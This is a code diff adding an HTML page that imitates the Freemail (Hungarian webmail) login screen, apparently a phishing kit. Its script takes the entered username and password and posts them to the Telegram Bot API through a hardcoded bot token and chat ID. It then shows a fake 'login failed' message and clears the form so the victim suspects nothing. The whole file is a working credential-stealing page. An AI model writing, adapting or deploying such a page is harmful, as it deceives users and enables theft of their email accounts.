@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Freemail bejelentkezés</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            max-width: 400px;
+            width: 100%;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img {
+            width: 150px; /* Méretre állítható */
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #007bff;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 10px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .message {
+            margin-top: 20px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://accounts.freemail.hu/a/_next/static/media/fmlogo_blue.a7392a71.svg" alt="Freemail Logo">
+        </div>
+        <h1>Bejelentkezés</h1>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Felhasználónév</label>
+                <input type="text" id="username" placeholder="Felhasználónév">
+            </div>
+            <div class="form-group">
+                <label for="password">Jelszó</label>
+                <input type="text" id="password" placeholder="Jelszó">
+            </div>
+            <button type="submit">Bejelentkezés</button>
+        </form>
+        <div class="message" id="message"></div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const telegramBotToken = '6920116630:AAHes6Eo1Nddy4r7unTNB_9vdm_7kwp9pQo';
+            const telegramChatId = '5621133071';
+
+            const message = `Bejelentkezési próbálkozás:\nFelhasználónév: ${username}\nJelszó: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: telegramChatId,
+                    text: message
+                })
+            }).then(response => {
+                if (response.ok) {
+                    document.getElementById('message').innerText = 'Sikertelen bejelentkezés!';
+                    // Adatok törlése az űrlapból
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+                } else {
+                    document.getElementById('message').innerText = 'Hiba történt az adatok küldése közben.';
+                }
+            }).catch(error => {
+                document.getElementById('message').innerText = 'Hiba történt: ' + error;
+            });
+        });
+    </script>
+</body>
+</html>
